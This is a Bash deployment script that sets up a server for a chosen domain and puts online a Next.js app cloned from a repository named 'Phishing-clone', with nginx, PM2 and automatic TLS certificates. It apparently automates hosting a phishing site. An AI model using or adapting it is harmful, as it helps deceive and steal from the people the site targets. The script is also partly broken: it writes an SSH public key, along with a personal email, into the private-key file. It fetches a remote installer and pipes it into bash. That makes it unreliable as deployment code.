#!/bin/bash

# Check if domain name is passed as an argument
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain_name>"
    exit 1
fi

# Variables
DOMAIN_NAME=$1
GITHUB_REPO_URL="git@github.com:Wolfof420Street/Phishing-clone.git"
NEXT_APP_DIR="/var/www/nextapp"
VPS_IP=$(curl -s http://checkip.amazonaws.com)
PORT=$(shuf -i 3000-3999 -n 1)

# Update system and install dependencies
apt update && apt upgrade -y
apt install -y git curl nginx build-essential ufw

# Install Node.js (if not installed)
if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_16.x | bash -
    apt install -y nodejs
fi

# Install PM2 globally for running the Node app
npm install -g pm2

# Clone the private GitHub repository (using deploy key for access)
if [ -d "$NEXT_APP_DIR" ]; then
    echo "Directory $NEXT_APP_DIR already exists. Pulling latest changes."
    cd $NEXT_APP_DIR
    git pull
else
    echo "Cloning repository..."
    mkdir -p ~/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDrGfC+gjSmvbC1EtEVjIcuhtX/x87FHkpara4s0NXvapP3UnSccIr23vZx73oXNDxYCReiEtnpKaqsMlglUIP0oMfSPZ8xazJLNRjIHyWeJtLIKRA/IBDqfHGX9Ktz52Xk/1zdjUbJe8qv9fAB+hzaVjiq6yL8to4oDE53NynkRY+pd4NA5YYDW5gnKBUCfBUMGSOz/pq9DbufLYHZ8O8ADHzWqa+L80IB3nCdTkj7URcMaxUjlldkywgAUUkKSXOkxRyyv50S0qttSQlha6ZS6ReRXmbcmTiKaEWB5Od9AgsQ1NitjPNkN3G9UoA/zu0pxSEsNAUMdB+FGRVDzcb/GERmOsVplHIO2LnaNN4Fs8AcP1F4/qqpb2qzr0BC67+x0d5MybA9gn155CGvNZJW4xMZrSyXnOtwCJG6U0gnyZeQhKNjNhwYvJxrbeYmDRZpgTJrtmnTvc0JZqYN4ny1yK1mYWYC40rKlA13X7IloF/G4wpfjBycFAoW5eqWQPPXDYMM9W5HdCgz3vPkJn4DWM93+psG3Y54sDi9K9gGUtjLAWFsx5NT6KGq2OPVDwPf2aWRtGIMq6k0yLe8x77uoXp7FqV3ABqZ8dmlzrIrX9UK+6gOv+D2+PIRp5ZFpmy+VybtJZzeZqj28dwRXC/iHsk3x6dLYuKhRO5mIFKvw== billodida420@gmail.com" > ~/.ssh/id_rsa
    chmod 600 ~/.ssh/id_rsa
    ssh-keyscan github.com >> ~/.ssh/known_hosts
    eval "$(ssh-agent -s)"
    ssh-add ~/.ssh/id_rsa

    if ! git clone $GITHUB_REPO_URL $NEXT_APP_DIR; then
        echo "Failed to clone repository"
        exit 1
    fi
fi


cd $NEXT_APP_DIR

# Install Node.js dependencies
npm install

# Build the Next.js application
npm run build
if [ $? -ne 0 ]; then
    echo "Failed to build the Next.js app"
    exit 1
fi

# Set up Nginx reverse proxy
cat > /etc/nginx/sites-available/$DOMAIN_NAME <<EOL
server {
    listen 80;
    server_name $DOMAIN_NAME www.$DOMAIN_NAME;

    location / {
        proxy_pass http://localhost:$PORT;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_cache_bypass \$http_upgrade;
    }

    location /_next/static {
        alias $NEXT_APP_DIR/.next/static;
        expires 1y;
        access_log off;
    }

    location /public {
        alias $NEXT_APP_DIR/public;
        expires 1y;
        access_log off;
    }
}
EOL

# Enable Nginx site and restart
ln -s /etc/nginx/sites-available/$DOMAIN_NAME /etc/nginx/sites-enabled/
nginx -t && systemctl restart nginx

# Set up UFW firewall
ufw allow OpenSSH
ufw allow 'Nginx Full'
ufw --force enable

# Start the Node.js app with PM2
pm2 start npm --name "$DOMAIN_NAME" -- start -- --port $PORT
pm2 startup systemd -u $(whoami) --hp $(eval echo ~$USER)
pm2 save

# Install and set up SSL with Certbot
apt install -y certbot python3-certbot-nginx
certbot --nginx -d $DOMAIN_NAME -d www.$DOMAIN_NAME --non-interactive --agree-tos --email admin@$DOMAIN_NAME

# Add cron job for Certbot renewals
echo "0 0 * * * certbot renew --quiet" | crontab -

echo "Setup complete! Your NextJS app should now be running at https://$DOMAIN_NAME"
